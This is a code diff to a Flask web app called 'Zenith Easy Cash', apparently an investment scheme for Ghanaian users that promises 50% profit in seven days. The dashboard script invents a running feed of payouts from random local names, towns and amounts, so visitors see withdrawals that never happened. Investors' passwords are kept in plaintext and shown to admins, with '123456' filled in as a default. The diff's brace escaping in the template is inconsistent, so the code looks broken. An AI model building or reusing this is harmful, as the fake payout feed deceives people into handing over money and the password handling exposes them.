@@ -32,10 +32,10 @@ ADMIN_TELEGRAM_LINK = "https://t.me/zenithsikagh"
 ZENITH_TICKER_INTERVAL_MS = 4500  # How fast new withdrawals appear (in milliseconds)
 ZENITH_MIN_WITHDRAWAL_MULTIPLE = 3  # Minimum multiplier base for random amounts (x100)
 ZENITH_MAX_WITHDRAWAL_MULTIPLE = 32  # Maximum multiplier base for random amounts (x100)
-ZENITH_MAX_VISIBLE_ITEMS = 6  # Max items kept in the sidebar feed at once
+ZENITH_MAX_VISIBLE_ITEMS = 5  # Max items kept in the sidebar feed at once
 
 # 📐 SIDEBAR STYLING CONTROLS (Adjust breadth/thickness here easily!)
-ZENITH_SIDEBAR_WIDTH = "260px"       # Change breadth/width 
+ZENITH_SIDEBAR_WIDTH = "120px"       # Change breadth/width (e.g., '220px' for tin, '340px' for broad)
 ZENITH_SIDEBAR_PADDING = "16px"      # Inner padding of the sidebar card
 ZENITH_SIDEBAR_MAX_HEIGHT = "80vh"   # Maximum vertical height limit
 
@@ -57,18 +57,13 @@ GHANA_TOWNS_POOL = [
 app = Flask(__name__)
 app.secret_key = "zenith_easy_cash_super_secure_secret_key_change_me"
 
-# DISK CONFIGURATION MOUNT PATH (/var/data)
-DISK_MOUNT_PATH = "/var/data"
-if not os.path.exists(DISK_MOUNT_PATH):
-  os.makedirs(DISK_MOUNT_PATH, exist_ok=True)
-
-DATA_FILE = os.path.join(DISK_MOUNT_PATH, "Master.json")
-SETTINGS_FILE = os.path.join(DISK_MOUNT_PATH, "settings.json")
-UPLOAD_FOLDER = os.path.join(DISK_MOUNT_PATH, "uploads")
+DATA_FILE = "Master.json"
+SETTINGS_FILE = "settings.json"
+UPLOAD_FOLDER = "uploads"
 app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
 
 if not os.path.exists(UPLOAD_FOLDER):
-  os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+  os.makedirs(UPLOAD_FOLDER)
 
 DEFAULT_AVATAR_SVG = "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2394a3b8'><path d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z'/></svg>"
 
@@ -524,7 +519,7 @@ INVESTOR_LOGIN_TEMPLATE = """
 </html>
 """
 
-INVESTOR_DASHBOARD_TEMPLATE = """
+INVESTOR_DASHBOARD_TEMPLATE = f"""
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -532,31 +527,31 @@ INVESTOR_DASHBOARD_TEMPLATE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Investor Dashboard - Zenith Easy Cash</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
+        body {{ font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }}
         
         /* WIDE SIDE-BY-SIDE LAYOUT */
-        .main-layout { max-width: 1150px; margin: auto; display: flex; gap: 20px; align-items: flex-start; }
-        .dashboard-container { flex: 2.3; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .main-layout {{ max-width: 1150px; margin: auto; display: flex; gap: 20px; align-items: flex-start; }}
+        .dashboard-container {{ flex: 2.3; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }}
         
         /* SIDEBAR TICKER CARD LAYOUT CONTROLLED BY TOP CONFIG VARIABLES */
-        .sidebar-ticker { 
-            width: {{ zenith_sidebar_width }}; 
+        .sidebar-ticker {{ 
+            width: {{{{ zenith_sidebar_width }}}}; 
             flex-shrink: 0;
             background: #111827; 
             color: #ffffff; 
-            padding: {{ zenith_sidebar_padding }}; 
+            padding: {{{{ zenith_sidebar_padding }}}}; 
             border-radius: 8px; 
             position: sticky; 
             top: 20px; 
-            max-height: {{ zenith_sidebar_max_height }}; 
+            max-height: {{{{ zenith_sidebar_max_height }}}}; 
             overflow-y: auto;
             border: 1px solid #1f2937;
             box-shadow: 0 4px 15px rgba(0,0,0,0.25);
             box-sizing: border-box;
-        }
+        }}
 
         /* STICKY HEADER WITH GPS BLINKING TAG */
-        .sidebar-sticky-header {
+        .sidebar-sticky-header {{
             position: sticky;
             top: 0;
             background: #111827;
@@ -565,8 +560,8 @@ INVESTOR_DASHBOARD_TEMPLATE = """
             border-bottom: 1px solid #334155;
             margin-bottom: 12px;
             text-align: center;
-        }
-        .gps-online-tag {
+        }}
+        .gps-online-tag {{
             display: inline-flex;
             align-items: center;
             gap: 6px;
@@ -577,8 +572,8 @@ INVESTOR_DASHBOARD_TEMPLATE = """
             font-size: 11px;
             font-weight: bold;
             margin-bottom: 6px;
-        }
-        .gps-dot {
+        }}
+        .gps-dot {{
             width: 8px;
             height: 8px;
             background-color: #22c55e;
@@ -586,39 +581,39 @@ INVESTOR_DASHBOARD_TEMPLATE = """
             display: inline-block;
             box-shadow: 0 0 8px #22c55e;
             animation: gpsBlink 1.2s infinite ease-in-out;
-        }
-        @keyframes gpsBlink {
-            0% { transform: scale(0.9); opacity: 0.5; }
-            50% { transform: scale(1.3); opacity: 1; box-shadow: 0 0 12px #22c55e; }
-            100% { transform: scale(0.9); opacity: 0.5; }
-        }
+        }}
+        @keyframes gpsBlink {{
+            0% {{ transform: scale(0.9); opacity: 0.5; }}
+            50% {{ transform: scale(1.3); opacity: 1; box-shadow: 0 0 12px #22c55e; }}
+            100% {{ transform: scale(0.9); opacity: 0.5; }}
+        }}
         
-        h2 { color: #028a0f; margin-top: 0; }
-        .logout { float: right; }
-        .logout a { background: #c62828; color: white; padding: 6px 12px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 13px; }
-        .home-link-top { margin-bottom: 15px; font-size: 14px; display: flex; justify-content: space-between; align-items: center; }
-        .home-link-top a { color: #028a0f; text-decoration: none; font-weight: bold; }
-        .profile-btn-link { background: #028a0f; color: #fff; padding: 6px 12px; border-radius: 4px; text-decoration: none; font-size: 13px; font-weight: bold; }
-        .card { background: #f1f8e9; padding: 18px; border-radius: 6px; margin-top: 18px; border-left: 5px solid #2e7d32; line-height: 1.6; }
+        h2 {{ color: #028a0f; margin-top: 0; }}
+        .logout {{ float: right; }}
+        .logout a {{ background: #c62828; color: white; padding: 6px 12px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 13px; }}
+        .home-link-top {{ margin-bottom: 15px; font-size: 14px; display: flex; justify-content: space-between; align-items: center; }}
+        .home-link-top a {{ color: #028a0f; text-decoration: none; font-weight: bold; }}
+        .profile-btn-link {{ background: #028a0f; color: #fff; padding: 6px 12px; border-radius: 4px; text-decoration: none; font-size: 13px; font-weight: bold; }}
+        .card {{ background: #f1f8e9; padding: 18px; border-radius: 6px; margin-top: 18px; border-left: 5px solid #2e7d32; line-height: 1.6; }}
         
-        .balance-cards-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px; }
-        .balance-card { background: #f8fafc; border: 1px solid #e2e8f0; padding: 15px; border-radius: 6px; text-align: center; }
-        .balance-card.current { border-left: 4px solid #028a0f; background: #f0fdf4; }
-        .balance-card.pending { border-left: 4px solid #d97706; background: #fffbeb; }
-        .balance-card h4 { margin: 0 0 5px 0; font-size: 12px; color: #64748b; text-transform: uppercase; }
-        .balance-card .amount { font-size: 18px; font-weight: bold; color: #0f172a; margin: 0; }
+        .balance-cards-grid {{ display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px; }}
+        .balance-card {{ background: #f8fafc; border: 1px solid #e2e8f0; padding: 15px; border-radius: 6px; text-align: center; }}
+        .balance-card.current {{ border-left: 4px solid #028a0f; background: #f0fdf4; }}
+        .balance-card.pending {{ border-left: 4px solid #d97706; background: #fffbeb; }}
+        .balance-card h4 {{ margin: 0 0 5px 0; font-size: 12px; color: #64748b; text-transform: uppercase; }}
+        .balance-card .amount {{ font-size: 18px; font-weight: bold; color: #0f172a; margin: 0; }}
 
-        .btn-withdraw { background: #028a0f; color: white; padding: 10px 15px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold; margin-top: 10px; width: 100%; text-align: center; box-sizing: border-box; }
-        .btn-topup-toggle { background: #ffa000; color: white; padding: 8px 15px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold; margin-top: 10px; border: none; cursor: pointer; }
-        .topup-dropdown { background: #fff8e1; border: 1px dashed #ffa000; padding: 15px; margin-top: 12px; border-radius: 6px; display: none; }
-        .loading-badge { display: inline-flex; align-items: center; gap: 8px; background: #e0f2fe; color: #0369a1; padding: 6px 12px; border-radius: 20px; font-weight: bold; font-size: 13px; }
-        .spinner { width: 14px; height: 14px; border: 2px solid #0369a1; border-top: 2px solid transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .countdown-live-box { background: #0f172a; color: #38bdf8; padding: 10px; border-radius: 6px; font-family: monospace; font-size: 13px; margin-top: 8px; text-align: center; font-weight: bold; }
-        .flash { background: #e0f2fe; color: #0369a1; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; font-weight: bold; }
+        .btn-withdraw {{ background: #028a0f; color: white; padding: 10px 15px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold; margin-top: 10px; width: 100%; text-align: center; box-sizing: border-box; }}
+        .btn-topup-toggle {{ background: #ffa000; color: white; padding: 8px 15px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold; margin-top: 10px; border: none; cursor: pointer; }}
+        .topup-dropdown {{ background: #fff8e1; border: 1px dashed #ffa000; padding: 15px; margin-top: 12px; border-radius: 6px; display: none; }}
+        .loading-badge {{ display: inline-flex; align-items: center; gap: 8px; background: #e0f2fe; color: #0369a1; padding: 6px 12px; border-radius: 20px; font-weight: bold; font-size: 13px; }}
+        .spinner {{ width: 14px; height: 14px; border: 2px solid #0369a1; border-top: 2px solid transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }}
+        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
+        .countdown-live-box {{ background: #0f172a; color: #38bdf8; padding: 10px; border-radius: 6px; font-family: monospace; font-size: 13px; margin-top: 8px; text-align: center; font-weight: bold; }}
+        .flash {{ background: #e0f2fe; color: #0369a1; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; font-weight: bold; }}
         
         /* SIDEBAR FEED ITEM STYLING WITH SMOOTH FADE OUT */
-        .side-ticker-item { 
+        .side-ticker-item {{ 
             background: #1e293b; 
             border: 1px solid #334155;
             border-left: 4px solid #22c55e; 
@@ -631,29 +626,29 @@ INVESTOR_DASHBOARD_TEMPLATE = """
             opacity: 0;
             transform: translateY(-10px);
             transition: all 0.4s ease-in-out;
-        }
-        .side-ticker-item.show {
+        }}
+        .side-ticker-item.show {{
             opacity: 1;
             transform: translateY(0);
-        }
-        .side-ticker-item.fade-out {
+        }}
+        .side-ticker-item.fade-out {{
             opacity: 0;
             transform: scale(0.95);
-        }
-        .side-ticker-item .name-town { 
+        }}
+        .side-ticker-item .name-town {{ 
             font-size: 13px; 
             font-weight: bold; 
             color: #facc15; 
             margin-bottom: 2px; 
-        }
-        .side-ticker-item .payout-text { 
+        }}
+        .side-ticker-item .payout-text {{ 
             font-size: 12px; 
             color: #cbd5e1; 
-        }
-        .side-ticker-item .payout-text b { 
+        }}
+        .side-ticker-item .payout-text b {{ 
             color: #4ade80; 
-        }
-        .company-momo-display { background: #fff3cd; border: 1px solid #ffeeba; padding: 10px; border-radius: 4px; margin-bottom: 10px; font-size: 13px; color: #856404; text-align: center; }
+        }}
+        .company-momo-display {{ background: #fff3cd; border: 1px solid #ffeeba; padding: 10px; border-radius: 4px; margin-bottom: 10px; font-size: 13px; color: #856404; text-align: center; }}
     </style>
 </head>
 <body>
@@ -664,7 +659,7 @@ INVESTOR_DASHBOARD_TEMPLATE = """
                 <a href="{{ url_for('profile_page') }}" class="profile-btn-link">👤 My Profile Settings</a>
             </div>
             <div>
-                <h2>Welcome, {{ investor.name }}</h2>
+                <h2>Welcome, {{{{ investor.name }}}}</h2>
                 <div class="logout"><a href="{{ url_for('logout') }}">Logout</a></div>
                 <div style="clear: both;"></div>
             </div>
@@ -673,81 +668,81 @@ INVESTOR_DASHBOARD_TEMPLATE = """
             <div class="balance-cards-grid">
                 <div class="balance-card current">
                     <h4>Current Balance Available</h4>
-                    <p class="amount">GHs {{ "%.2f"|format(current_balance) }}</p>
+                    <p class="amount">GHs {{{{ "%.2f"|format(current_balance) }}}}</p>
                 </div>
                 <div class="balance-card pending">
                     <h4>Pending Balance Available</h4>
-                    <p class="amount">GHs {{ "%.2f"|format(pending_balance) }}</p>
+                    <p class="amount">GHs {{{{ "%.2f"|format(pending_balance) }}}}</p>
                 </div>
             </div>
 
-            {% with messages = get_flashed_messages() %}
-              {% if messages %}<div class="flash">{{ messages[0] }}</div>{% endif %}
-            {% endwith %}
+            {{% with messages = get_flashed_messages() %}}
+              {{% if messages %}}<div class="flash">{{{{ messages[0] }}}}</div>{{% endif %}}
+            {{% endwith %}}
 
-            {% if investments %}
-                {% for inv in investments %}
+            {{% if investments %}}
+                {{% for inv in investments %}}
                 <div class="card">
-                    <p style="margin-top:0;"><strong>Investment Slot #{{ loop.index }}</strong></p>
-                    <p><strong>Capital Invested:</strong> GHs {{ "%.2f"|format(inv.amount) }} <span style="color:#028a0f; font-size:12px;">(+50% Expected Payout: GHs {{ "%.2f"|format(inv.expected_return) }})</span></p>
-                    <p><strong>Payment Proof / ID:</strong> {{ inv.transaction_id }}</p>
-                    <p><strong>Registered On:</strong> {{ inv.date_time }}</p>
-                    <p><strong>Maturity Target Date:</strong> <span style="color: #028a0f; font-weight: bold;">{{ inv.maturity_date }}</span></p>
+                    <p style="margin-top:0;"><strong>Investment Slot #{{{{ loop.index }}}}</strong></p>
+                    <p><strong>Capital Invested:</strong> GHs {{{{ "%.2f"|format(inv.amount) }}}} <span style="color:#028a0f; font-size:12px;">(+50% Expected Payout: GHs {{{{ "%.2f"|format(inv.expected_return) }}}})</span></p>
+                    <p><strong>Payment Proof / ID:</strong> {{{{ inv.transaction_id }}}}</p>
+                    <p><strong>Registered On:</strong> {{{{ inv.date_time }}}}</p>
+                    <p><strong>Maturity Target Date:</strong> <span style="color: #028a0f; font-weight: bold;">{{{{ inv.maturity_date }}}}</span></p>
                     
                     <p><strong>Live Tracker:</strong>
-                        <div class="countdown-live-box" data-maturity="{{ inv.maturity_date }}" id="tracker_{{ loop.index0 }}">
-                            {% if inv.maturity_date == 'Pending Approval' %}
+                        <div class="countdown-live-box" data-maturity="{{{{ inv.maturity_date }}}}" id="tracker_{{{{ loop.index0 }}}">
+                            {{% if inv.maturity_date == 'Pending Approval' %}}
                                 ⏳ Timer will start counting once payment is verified by Admin.
-                            {% else %}
+                            {{% else %}}
                                 Calculating remaining time...
-                            {% endif %}
+                            {{% endif %}}
                         </div>
                     </p>
 
                     <p><strong>Status:</strong> 
-                        {% if inv.status == 'Pending Admin Payment Confirmation' %}
+                        {{% if inv.status == 'Pending Admin Payment Confirmation' %}}
                             <span style="color: #c2410c; font-weight: bold;">⏳ Pending Admin Approval</span>
-                        {% elif inv.status == 'Payment Confirmed & Active' %}
+                        {{% elif inv.status == 'Payment Confirmed & Active' %}}
                             <div class="loading-badge">
                                 <div class="spinner"></div> Active & Yielding 50% Profit...
                             </div>
-                        {% elif inv.status == 'Withdrawal Requested' %}
+                        {{% elif inv.status == 'Withdrawal Requested' %}}
                             <span style="color: #1d4ed8; font-weight: bold;">📥 Withdrawal Requested - 12hr Payout Countdown: 
-                                <span id="withdrawalTimer_{{ loop.index0 }}" style="font-family:monospace; background:#e0f2fe; padding:2px 6px; border-radius:4px;">Loading...</span>
+                                <span id="withdrawalTimer_{{{{ loop.index0 }}}}" style="font-family:monospace; background:#e0f2fe; padding:2px 6px; border-radius:4px;">Loading...</span>
                             </span>
-                        {% elif inv.status == 'Withdrawn Completed' %}
+                        {{% elif inv.status == 'Withdrawn Completed' %}}
                             <span style="color: #15803d; font-weight: bold;">✅ Completed & Paid Out (Capital + Profit)</span>
-                        {% else %}
-                            <span style="color: #555; font-weight: bold;">{{ inv.status }}</span>
-                        {% endif %}
+                        {{% else %}}
+                            <span style="color: #555; font-weight: bold;">{{{{ inv.status }}}}</span>
+                        {{% endif %}}
                     </p>
                     
-                    {% if inv.status == 'Payment Confirmed & Active' %}
-                    <button type="button" class="btn-topup-toggle" onclick="toggleTopup({{ loop.index0 }})">➕ Top-Up / Make Another Investment</button>
+                    {{% if inv.status == 'Payment Confirmed & Active' %}}
+                    <button type="button" class="btn-topup-toggle" onclick="toggleTopup({{{{ loop.index0 }}}})">➕ Top-Up / Make Another Investment</button>
                     
-                    <form action="{{ url_for('topup', sub_idx=inv.sub_idx) }}" method="POST" class="topup-dropdown" id="topupBox_{{ loop.index0 }}" enctype="multipart/form-data">
+                    <form action="{{{{ url_for('topup', sub_idx=inv.sub_idx) }}}}" method="POST" class="topup-dropdown" id="topupBox_{{{{ loop.index0 }}}}" enctype="multipart/form-data">
                         <div class="company-momo-display">
                             <strong>COMPANY MOMO ACCOUNT:</strong><br>
-                            Number: <b>{{ settings.momo_number }}</b> | Name: <b>{{ settings.momo_name }}</b><br>
+                            Number: <b>{{{{ settings.momo_number }}}}</b> | Name: <b>{{{{ settings.momo_name }}}}</b><br>
                             <small>Send payment first before uploading proof below!</small>
                         </div>
                         <label style="font-size:12px;">Top-Up Amount (GHs):</label>
                         <input type="number" name="topup_amount" min="200" step="1" required placeholder="Enter amount (Min 200 GHs)" style="padding:8px; margin-bottom:8px; width:100%; box-sizing:border-box;">
                         <input type="text" name="topup_proof" placeholder="MoMo Transaction ID" style="padding:8px; margin-bottom:8px; font-size:12px; width:100%; box-sizing:border-box;">
-                        <label style="font-size:11px; color:#555; display:block;">Upload Screenshot Receipt:</label>
+                        <label style="font-size:11px; color:#555;">Upload Screenshot Receipt:</label>
                         <input type="file" name="topup_screenshot" accept="image/*" style="font-size:11px; margin-bottom:8px;">
                         <button type="submit" style="background:#2e7d32; color:white; border:none; padding:10px; width:100%; font-weight:bold; border-radius:4px; cursor:pointer;">Submit Top-Up for Confirmation</button>
                     </form>
-                    {% endif %}
+                    {{% endif %}}
 
-                    {% if inv.can_withdraw and inv.status != 'Withdrawal Requested' and inv.status != 'Withdrawn Completed' %}
-                        <a href="{{ url_for('withdraw', sub_idx=inv.sub_idx) }}" class="btn-withdraw">📥 Request Withdrawal Now (GHs {{ "%.2f"|format(inv.expected_return) }})</a>
-                    {% endif %}
+                    {{% if inv.can_withdraw and inv.status != 'Withdrawal Requested' and inv.status != 'Withdrawn Completed' %}}
+                        <a href="{{{{ url_for('withdraw', sub_idx=inv.sub_idx) }}}}" class="btn-withdraw">📥 Request Withdrawal Now (GHs {{{{ "%.2f"|format(inv.expected_return) }}}})</a>
+                    {{% endif %}}
                 </div>
-                {% endfor %}
-            {% else %}
+                {{% endfor %}}
+            {{% else %}}
                 <p style="text-align:center; color:#666;">No investment records found.</p>
-            {% endif %}
+            {{% endif %}}
         </div>
 
         <!-- SIDEBAR TICKER CARD -->
@@ -761,62 +756,62 @@ INVESTOR_DASHBOARD_TEMPLATE = """
     </div>
 
     <script>
-        const tickerIntervalMs = {{ zenith_ticker_interval_ms }};
-        const minMultiplier = {{ zenith_min_withdrawal_multiple }};
-        const maxMultiplier = {{ zenith_max_withdrawal_multiple }};
-        const maxVisibleItems = {{ zenith_max_visible_items }};
+        const tickerIntervalMs = {{{{ zenith_ticker_interval_ms }}}};
+        const minMultiplier = {{{{ zenith_min_withdrawal_multiple }}}};
+        const maxMultiplier = {{{{ zenith_max_withdrawal_multiple }}}};
+        const maxVisibleItems = {{{{ zenith_max_visible_items }}}};
 
-        function toggleTopup(idx) {
+        function toggleTopup(idx) {{
             const box = document.getElementById('topupBox_' + idx);
-            if (box) {
+            if (box) {{
                 box.style.display = box.style.display === 'block' ? 'none' : 'block';
-            }
-        }
+            }}
+        }}
 
-        function updateTrackers() {
-            document.querySelectorAll('.countdown-live-box').forEach(el => {
+        function updateTrackers() {{
+            document.querySelectorAll('.countdown-live-box').forEach(el => {{
                 const targetStr = el.getAttribute('data-maturity');
-                if (!targetStr || targetStr === 'Pending Approval') {
+                if (!targetStr || targetStr === 'Pending Approval') {{
                     return;
-                }
+                }}
                 const targetDate = new Date(targetStr.replace(/-/g, "/"));
                 const now = new Date();
                 const diff = Math.floor((targetDate - now) / 1000);
 
-                if (diff > 0) {
+                if (diff > 0) {{
                     const days = Math.floor(diff / (3600 * 24));
                     const hrs = Math.floor((diff % (3600 * 24)) / 3600);
                     const mins = Math.floor((diff % 3600) / 60);
                     const secs = diff % 60;
-                    el.innerHTML = `⏳ Time Left: ${days}d ${hrs}h ${mins}m ${secs}s`;
-                } else {
+                    el.innerHTML = `⏳ Time Left: ${{days}}d ${{hrs}}h ${{mins}}m ${{secs}}s`;
+                }} else {{
                     el.innerHTML = `🎉 Maturity Reached! Ready for Withdrawal`;
                     el.style.color = "#4ade80";
-                }
-            });
-        }
+                }}
+            }});
+        }}
 
-        function updateWithdrawalCountdowns() {
-            document.querySelectorAll('[id^="withdrawalTimer_"]').forEach((el, index) => {
+        function updateWithdrawalCountdowns() {{
+            document.querySelectorAll('[id^="withdrawalTimer_"]').forEach((el, index) => {{
                 let secondsLeft = 43200 - Math.floor((Date.now() / 1000) % 43200);
                 let hrs = Math.floor(secondsLeft / 3600);
                 let mins = Math.floor((secondsLeft % 3600) / 60);
                 let secs = secondsLeft % 60;
-                el.innerHTML = `${hrs}h ${mins}m ${secs}s`;
-            });
-        }
+                el.innerHTML = `${{hrs}}h ${{mins}}m ${{secs}}s`;
+            }});
+        }}
 
-        setInterval(() => {
+        setInterval(() => {{
             updateTrackers();
             updateWithdrawalCountdowns();
-        }, 1000);
+        }}, 1000);
         updateTrackers();
         updateWithdrawalCountdowns();
 
         const sideNames = {json.dumps(GHANA_NAMES_POOL)};
         const sideTowns = {json.dumps(GHANA_TOWNS_POOL)};
         
-        function addSideTickerItem() {
+        function addSideTickerItem() {{
             const list = document.getElementById('sideTickerList');
             if (!list) return;
             const name = sideNames[Math.floor(Math.random() * sideNames.length)];
@@ -827,30 +822,26 @@ INVESTOR_DASHBOARD_TEMPLATE = """
             const item = document.createElement('div');
             item.className = 'side-ticker-item';
             item.innerHTML = `
-                <div class="name-town">${name}</div>
-                <div style="font-size:11px; color:#94a3b8; margin-bottom:2px;">(${town})</div>
-                <div class="payout-text">Cashed out <b>GHs ${amt.toLocaleString()}</b> via MoMo</div>
+                <div class="name-town">${{name}}</div>
+                <div style="font-size:11px; color:#94a3b8; margin-bottom:2px;">(${{town}})</div>
+                <div class="payout-text">Cashed out <b>GHs ${{amt.toLocaleString()}}</b> via MoMo</div>
             `;
             list.prepend(item);
             
             // Trigger roll-in animation
-            setTimeout(() => { item.classList.add('show'); }, 50);
+            setTimeout(() => {{ item.classList.add('show'); }}, 50);
 
             // Manage maximum visible items with a fade-out effect
-            if (list.children.length > maxVisibleItems) {
+            if (list.children.length > maxVisibleItems) {{
                 const lastItem = list.lastElementChild;
                 lastItem.classList.add('fade-out');
-                setTimeout(() => { lastItem.remove(); }, 400);
-            }
-        }
-        
-        // Initial population of the side ticker list and loop generator
-        if (document.getElementById('sideTickerList')) {
-            addSideTickerItem();
-            addSideTickerItem();
-            addSideTickerItem();
-            setInterval(addSideTickerItem, tickerIntervalMs);
-        }
+                setTimeout(() => {{ lastItem.remove(); }}, 400);
+            }}
+        }}
+        setInterval(addSideTickerItem, tickerIntervalMs);
+        addSideTickerItem();
+        addSideTickerItem();
+        addSideTickerItem();
     </script>
 </body>
 </html>
@@ -1467,17 +1458,15 @@ def admin_dashboard():
           }
       ]
     for s_idx, slot in enumerate(inv_list):
-      slot_copy = slot.copy()
-      slot_copy["parent_idx"] = p_idx
-      slot_copy["sub_idx"] = s_idx
-      slot_copy["name"] = inv.get("name", "Unknown")
-      slot_copy["number"] = inv.get("number", "Unknown")
-      slot_copy["password"] = inv.get("password", "N/A")
-      slot_copy["work"] = inv.get("work", "N/A")
-      slot_copy["region"] = inv.get("region", "N/A")
-      if "expected_return" not in slot_copy:
-        slot_copy["expected_return"] = slot_copy["amount"] * 1.5
-      flat_investments.append(slot_copy)
+      item = slot.copy()
+      item["parent_idx"] = p_idx
+      item["sub_idx"] = s_idx
+      item["name"] = inv.get("name")
+      item["number"] = inv.get("number")
+      item["password"] = inv.get("password", "123456")
+      item["work"] = inv.get("work", "-")
+      item["region"] = inv.get("region", "-")
+      flat_investments.append(item)
 
   settings = load_settings()
   return render_template_string(
@@ -1487,7 +1476,7 @@ def admin_dashboard():
   )
 
 
-@app.route("/admin/update-settings", methods=["POST"])
+@app.route("/admin/settings", methods=["POST"])
 def update_settings():
   if not session.get("admin_logged_in"):
     return redirect(url_for("admin_login"))
@@ -1497,51 +1486,62 @@ def update_settings():
   )
   settings["momo_name"] = request.form.get("momo_name", settings["momo_name"])
   save_settings(settings)
-  flash("Company MoMo details updated successfully!")
+  flash("Company details updated.")
   return redirect(url_for("admin_dashboard"))
 
 
 @app.route(
-    "/admin/confirm-payment/<int:parent_idx>/<int:sub_idx>", methods=["POST"]
+    "/admin/confirm/<int:parent_idx>/<int:sub_idx>", methods=["POST"]
 )
 def confirm_payment(parent_idx, sub_idx):
   if not session.get("admin_logged_in"):
     return redirect(url_for("admin_login"))
   investors = load_investors()
   if 0 <= parent_idx < len(investors):
-    inv = investors[parent_idx]
-    inv_list = inv.get("investments", [])
+    inv_list = investors[parent_idx].get("investments", [])
     if 0 <= sub_idx < len(inv_list):
       inv_list[sub_idx]["status"] = "Payment Confirmed & Active"
-      maturity = datetime.now() + timedelta(days=7)
+      now = datetime.now()
+      maturity = now + timedelta(days=7)
       inv_list[sub_idx]["maturity_date"] = maturity.strftime(
           "%Y-%m-%d %H:%M:%S"
       )
       save_all_investors(investors)
-      send_telegram_alert(
-          f"✅ <b>PAYMENT CONFIRMED & ACTIVE</b>\n👤 Name: {inv.get('name')}\n📞 Number: {inv.get('number')}\n⏰ Maturity Set to 7 Days Later."
-      )
-      flash("Payment confirmed and countdown started!")
   return redirect(url_for("admin_dashboard"))
 
 
 @app.route(
-    "/admin/complete-withdrawal/<int:parent_idx>/<int:sub_idx>", methods=["POST"]
+    "/admin/complete-withdrawal/<int:parent_idx>/<int:sub_idx>",
+    methods=["POST"],
 )
 def complete_withdrawal(parent_idx, sub_idx):
   if not session.get("admin_logged_in"):
     return redirect(url_for("admin_login"))
   investors = load_investors()
   if 0 <= parent_idx < len(investors):
-    inv = investors[parent_idx]
-    inv_list = inv.get("investments", [])
+    inv_list = investors[parent_idx].get("investments", [])
     if 0 <= sub_idx < len(inv_list):
       inv_list[sub_idx]["status"] = "Withdrawn Completed"
       save_all_investors(investors)
-      send_telegram_alert(
-          f"💸 <b>PAYOUT COMPLETED</b>\n👤 Name: {inv.get('name')}\n📞 Number: {inv.get('number')}\n💰 Amount Paid Out Successfully!"
-      )
-      flash("Withdrawal marked as completed!")
+  return redirect(url_for("admin_dashboard"))
+
+
+@app.route(
+    "/admin/update-maturity/<int:parent_idx>/<int:sub_idx>",
+    methods=["POST"],
+)
+def update_maturity(parent_idx, sub_idx):
+  if not session.get("admin_logged_in"):
+    return redirect(url_for("admin_login"))
+  investors = load_investors()
+  if 0 <= parent_idx < len(investors):
+    inv_list = investors[parent_idx].get("investments", [])
+    if 0 <= sub_idx < len(inv_list):
+      new_time = request.form.get("new_maturity", "").strip()
+      if new_time:
+        inv_list[sub_idx]["maturity_date"] = new_time
+        save_all_investors(investors)
+        flash("Maturity date successfully updated.")
   return redirect(url_for("admin_dashboard"))
 
 
@@ -1555,31 +1555,11 @@ def update_password(parent_idx):
     if new_pass:
       investors[parent_idx]["password"] = new_pass
       save_all_investors(investors)
-      flash("Investor password updated successfully!")
+      flash("Password updated.")
   return redirect(url_for("admin_dashboard"))
 
 
-@app.route(
-    "/admin/update-maturity/<int:parent_idx>/<int:sub_idx>", methods=["POST"]
-)
-def update_maturity(parent_idx, sub_idx):
-  if not session.get("admin_logged_in"):
-    return redirect(url_for("admin_login"))
-  investors = load_investors()
-  if 0 <= parent_idx < len(investors):
-    new_mat = request.form.get("new_maturity", "").strip()
-    if new_mat:
-      inv_list = investors[parent_idx].get("investments", [])
-      if 0 <= sub_idx < len(inv_list):
-        inv_list[sub_idx]["maturity_date"] = new_mat
-        save_all_investors(investors)
-        flash("Maturity date updated successfully!")
-  return redirect(url_for("admin_dashboard"))
-
-
-@app.route(
-    "/admin/delete-slot/<int:parent_idx>/<int:sub_idx>", methods=["POST"]
-)
+@app.route("/admin/delete/<int:parent_idx>/<int:sub_idx>", methods=["POST"])
 def delete_slot(parent_idx, sub_idx):
   if not session.get("admin_logged_in"):
     return redirect(url_for("admin_login"))
@@ -1588,15 +1568,17 @@ def delete_slot(parent_idx, sub_idx):
     inv_list = investors[parent_idx].get("investments", [])
     if 0 <= sub_idx < len(inv_list):
       inv_list.pop(sub_idx)
+      if not inv_list:
+        investors.pop(parent_idx)
       save_all_investors(investors)
-      flash("Investment slot deleted successfully!")
+      flash("Investment slot deleted.")
   return redirect(url_for("admin_dashboard"))
 
 
 @app.route("/admin-logout")
 def admin_logout():
